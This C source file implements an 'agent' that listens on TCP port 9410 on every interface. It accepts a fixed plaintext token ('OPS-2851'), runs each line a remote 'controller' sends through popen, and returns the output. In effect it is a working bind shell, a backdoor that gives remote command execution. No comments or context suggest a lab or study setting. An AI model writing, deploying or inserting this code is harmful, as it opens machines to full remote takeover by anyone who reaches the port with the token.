#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <pthread.h>

#define PORT 9410
#define AUTH_TOKEN "OPS-2851"
#define SID_TAG "SID:1582"

int recv_line(int sock, char *buffer, size_t size) {
    size_t i = 0;

    while (i < size - 1) {
        ssize_t n = recv(sock, &buffer[i], 1, 0);

        if (n == 0) {
            return 0;
        }

        if (n < 0) {
            return -1;
        }

        if (buffer[i] == '\n') {
            buffer[i + 1] = '\0';
            return (int)(i + 1);
        }

        i++;
    }

    buffer[i] = '\0';
    return (int)i;
}

void *handle_client(void *arg) {
    int new_socket = *((int *)arg);
    free(arg);

    char buffer[4096] = {0};

    printf("Controller connected!\n");

    int valread = recv_line(new_socket, buffer, sizeof(buffer));

    if (valread > 0) {
        char expected_auth[128];

        snprintf(expected_auth, sizeof(expected_auth),
                 "AUTH %s\n", AUTH_TOKEN);

        if (strcmp(buffer, expected_auth) == 0) {
            printf("Authentication successful. Ready for commands.\n");

            char response[128];

            snprintf(response, sizeof(response),
                     "OK AUTHENTICATED %s\n", SID_TAG);

            send(new_socket, response, strlen(response), 0);

            while (1) {
                memset(buffer, 0, sizeof(buffer));

                int cmd_read = read(new_socket, buffer, sizeof(buffer));

                if (cmd_read <= 0 || strncmp(buffer, "exit", 4) == 0) {
                    printf("Controller disconnected.\n");
                    break;
                }

                printf("Executing: %s\n", buffer);

                FILE *fp = popen(buffer, "r");

                if (fp == NULL) {
                    send(new_socket,
                         "Failed to run command\n",
                         22,
                         0);
                    continue;
                }

                char output[4096] = {0};

                int bytes_read = fread(output, 1,
                                       sizeof(output) - 1,
                                       fp);

                if (bytes_read > 0) {
                    send(new_socket, output, bytes_read, 0);
                } else {
                    send(new_socket,
                         "(Command executed without output)\n",
                         34,
                         0);
                }

                pclose(fp);
            }

        } else {
            printf("Authentication failed. Dropping connection.\n");

            char response[128];

            snprintf(response, sizeof(response),
                     "ERR 001 AUTH_FAILED %s\n", SID_TAG);

            send(new_socket, response, strlen(response), 0);
        }
    }

    close(new_socket);

    return NULL;
}

int main() {
    int server_fd;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);

    server_fd = socket(AF_INET, SOCK_STREAM, 0);

    if (server_fd == -1) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    if (setsockopt(server_fd,
                   SOL_SOCKET,
                   SO_REUSEADDR,
                   &opt,
                   sizeof(opt))) {
        perror("setsockopt failed");
        exit(EXIT_FAILURE);
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    if (bind(server_fd,
             (struct sockaddr *)&address,
             sizeof(address)) < 0) {
        perror("Bind failed");
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, 10) < 0) {
        perror("Listen failed");
        exit(EXIT_FAILURE);
    }

    printf("Agent started. Listening on port %d...\n", PORT);

    while (1) {
        int new_socket = accept(server_fd,
                                (struct sockaddr *)&address,
                                (socklen_t *)&addrlen);

        if (new_socket < 0) {
            perror("Accept failed");
            continue;
        }

        int *client_socket = malloc(sizeof(int));

        if (client_socket == NULL) {
            perror("Memory allocation failed");
            close(new_socket);
            continue;
        }

        *client_socket = new_socket;

        pthread_t thread_id;

        if (pthread_create(&thread_id,
                           NULL,
                           handle_client,
                           client_socket) != 0) {
            perror("Thread creation failed");
            close(new_socket);
            free(client_socket);
            continue;
        }

        pthread_detach(thread_id);
    }

    close(server_fd);

    return 0;
}
